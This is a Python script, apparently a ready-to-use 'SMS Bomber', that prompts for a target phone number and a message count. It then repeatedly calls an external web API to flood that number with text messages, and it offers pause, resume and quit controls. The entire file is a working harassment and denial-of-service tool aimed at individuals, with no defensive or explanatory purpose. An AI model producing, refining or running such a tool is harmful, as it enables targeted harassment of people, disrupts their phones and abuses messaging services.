import requests
import threading
import time
import os

# Configuration
BASE_URL = "https://toshismsbmbapi.up.railway.app/"

# States
is_paused = False
stop_bomber = False

# Colorful terminal output
def show_response(message, type="info"):
    colors = {
        "success": "\033[92m",  # Green
        "error": "\033[91m",    # Red
        "info": "\033[96m",     # Cyan
        "warn": "\033[93m"      # Yellow
    }
    print(f"{colors.get(type, '')}{message}\033[0m")

def clear():
    os.system("cls" if os.name == "nt" else "clear")

def sms_bomber(phone, amount):
    global is_paused, stop_bomber
    sent_count = 0
    show_response(f"🚀 Starting SMS bomber for {phone}...", "success")

    while sent_count < amount and not stop_bomber:
        if is_paused:
            time.sleep(0.5)
            continue

        try:
            api_url = f"{BASE_URL}?phone={phone}&amount=1"
            response = requests.get(api_url, timeout=10)

            if response.status_code == 200:
                sent_count += 1
                show_response(f"✅ Sent message {sent_count}/{amount} to {phone}", "success")
            else:
                show_response(f"⚠️ API error (status {response.status_code}): {response.text}", "error")
                break

            time.sleep(0.8)  # delay between sends

        except Exception as err:
            show_response(f"❌ Error: {err}", "error")
            break

    if sent_count >= amount:
        show_response(f"🎉 Successfully sent {amount} messages to {phone}.", "success")

    stop_bomber = True

def main():
    global is_paused, stop_bomber
    clear()
    print("\033[95m" + "="*50)
    print("💣 SMS Bomber - Powered by Mistral Engine")
    print("="*50 + "\033[0m")

    phone = input("\n📱 Enter target phone number (without + or country code): ").strip()
    amount_input = input("💬 Enter number of messages to send: ").strip()

    try:
        amount = int(amount_input)
    except ValueError:
        show_response("❌ Amount must be a number.", "error")
        return

    if not phone or amount < 1 or len(phone) < 6:
        show_response("⚠️ Invalid phone number or amount.", "error")
        return

    bomber_thread = threading.Thread(target=sms_bomber, args=(phone, amount))
    bomber_thread.start()

    show_response("\n🕹️ Controls: [p]ause | [r]esume | [q]uit", "warn")

    while not stop_bomber:
        cmd = input().strip().lower()
        if cmd == "p":
            is_paused = True
            show_response("⏸️ Paused", "warn")
        elif cmd == "r":
            if is_paused:
                is_paused = False
                show_response("▶️ Resumed", "success")
        elif cmd == "q":
            stop_bomber = True
            show_response("⏹️ Stopped", "error")
            break

    bomber_thread.join()

if __name__ == "__main__":
    main()
